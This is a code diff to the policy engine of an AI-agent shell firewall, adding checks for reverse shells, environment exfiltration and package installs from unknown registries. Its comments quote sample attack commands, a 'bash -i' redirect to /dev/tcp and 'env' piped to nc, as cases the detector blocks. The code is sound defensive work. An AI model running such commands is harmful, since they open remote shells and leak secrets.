@@ -35,6 +35,8 @@ import {
   type ShellCommandAnalysis,
 } from '../shell';
 import { analyzeGit } from '../shell/git';
+import { analyzeOutbound } from '../shell/outbound';
+import { extractRegistryOverrides, isPublicRegistryHost } from '../shell/package-registry';
 import {
   matchesPattern,
   evaluateSmartConditions,
@@ -163,6 +165,10 @@ export interface PolicyHostHooks {
   /** The agent settings file at `absPath` as it is on disk now (a regular
    *  file within the host's size cap), or null (node9Firewall#413 part 4). */
   readAgentSettings?: (absPath: string) => string | null;
+  /** True when the user's own npm, yarn, bun, pip or uv configuration names
+   *  this registry host (node9Firewall#415 item 4). Absent: only the public
+   *  registries and the machine itself count as configured. */
+  isConfiguredRegistry?: (host: string, cwd?: string) => boolean;
 }
 
 export interface PolicyVerdict {
@@ -507,7 +513,7 @@ async function evaluatePolicyCore(
   hooks: PolicyHostHooks = {}
 ): Promise<PolicyVerdict> {
   const { agent, cwd, activeEnvironment } = context;
-  const { checkProvenance, isTrustedHost } = hooks;
+  const { checkProvenance, isTrustedHost, isConfiguredRegistry } = hooks;
   const settingsView = catalogSettings(config);
   const layers = inspectionLayers(config.policy);
   // ONE reader for every built-in site: the check's value in force.
@@ -624,6 +630,74 @@ async function evaluatePolicyCore(
   // https://trusted.com) can still downgrade AST's block — trust list is an
   // explicit user opt-in. See core.test.ts:1763 and v1.4.0-trusted-hosts.
   if (bashCommand !== null) {
+    // Outbound actions (node9Firewall#415): a shell wired to a socket, the
+    // whole environment handed to a sender, an install from a registry the
+    // user never set up. Judged FIRST in this tier: the tiers below return a
+    // review at once (pipe-chain, SQL, chmod), and `chmod 777 x; bash -i >&
+    // /dev/tcp/…` must not turn the block into an approvable prompt. A block
+    // returns here, ahead of user rules; a review is carried to the tier-3
+    // candidates like the git findings below.
+    const outboundChecks = ['commands.reverse-shell', 'data.env-exfil'] as const;
+    const outboundVerdicts: Array<PolicyVerdict | null> = [];
+    if (outboundChecks.some((id) => cv(id) !== 'off')) {
+      const outbound = analyzeOutbound(bashCommand);
+      for (const id of outboundChecks) {
+        const action = cv(id);
+        const finding =
+          action === 'off' ? undefined : outbound.findings.find((f) => f.checkId === id);
+        if (!finding) continue;
+        // The environment going to hosts the user trusts with secrets is the
+        // pipe-chain's trusted-host case: allowed. Judged on the hosts the
+        // environment is sent to, not every host in the command: a trusted
+        // `curl` beside `env | nc "$H" 9` must not exempt the nc.
+        if (id === 'data.env-exfil' && isTrustedHost) {
+          const hosts = finding.destinations;
+          if (hosts && hosts.length > 0 && hosts.every((h) => isTrustedHost(h))) continue;
+        }
+        outboundVerdicts.push(
+          applyCheckValue(action, {
+            decision: 'review',
+            blockedByLabel: `Node9 (AST): ${finding.ruleName}`,
+            reason: finding.reason,
+            tier: 2,
+            ruleName: finding.ruleName,
+            ruleDescription: finding.description,
+            checkId: finding.checkId,
+          })
+        );
+      }
+    }
+    const registryAction = cv('loading.unknown-registry');
+    if (registryAction !== 'off') {
+      const unknown = extractRegistryOverrides(bashCommand).filter(
+        (o) =>
+          !isPublicRegistryHost(o.host) &&
+          !(isTrustedHost?.(o.host) ?? false) &&
+          !(isConfiguredRegistry?.(o.host, cwd) ?? false)
+      );
+      if (unknown.length > 0) {
+        const named = [...new Set(unknown.map((o) => `${o.host} (${o.manager} ${o.via})`))];
+        outboundVerdicts.push(
+          applyCheckValue(registryAction, {
+            decision: 'review',
+            blockedByLabel: 'Node9 (AST): review-unknown-registry',
+            reason: `Package from an unknown registry: ${named.join(', ')} is not the public registry and not in your package manager configuration`,
+            tier: 2,
+            ruleName: 'review-unknown-registry',
+            ruleDescription:
+              'The package and its install scripts come from a registry nobody set up on this machine.',
+            checkId: 'loading.unknown-registry',
+          })
+        );
+      }
+    }
+    const outboundBlock = outboundVerdicts.find((v) => v?.decision === 'block');
+    if (outboundBlock) return outboundBlock;
+    for (const v of outboundVerdicts) {
+      if (v?.logged) noteLogged(v);
+      else if (v && !pendingAstReview) pendingAstReview = v;
+    }
+
     const pipeVerdict = pipeChainVerdict(bashCommand, isTrustedHost, cv('data.pipe-chain'));
     if (pipeVerdict?.logged) noteLogged(pipeVerdict);
     else if (pipeVerdict) return pipeVerdict;
